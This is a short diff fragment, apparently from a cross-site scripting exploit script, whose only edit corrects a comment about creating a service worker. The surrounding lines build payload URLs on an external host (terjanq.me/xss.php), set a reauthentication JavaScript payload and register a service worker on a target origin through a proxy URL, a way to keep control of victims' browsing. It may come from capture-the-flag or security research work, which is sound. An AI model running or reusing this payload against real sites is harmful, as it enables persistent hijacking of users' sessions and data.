@@ -40,7 +40,7 @@ setTimeout(() => { location.href=location.origin }, 3000);
 `;
 reauth.searchParams.set('js', reauthPayload);
 
-// Link to create service work
+// Link to create service worker
 let setup = new URL('https://terjanq.me/xss.php');
 setupPayload = `
 navigator.serviceWorker.register("${target+encodeURIComponent(proxy.href)}");
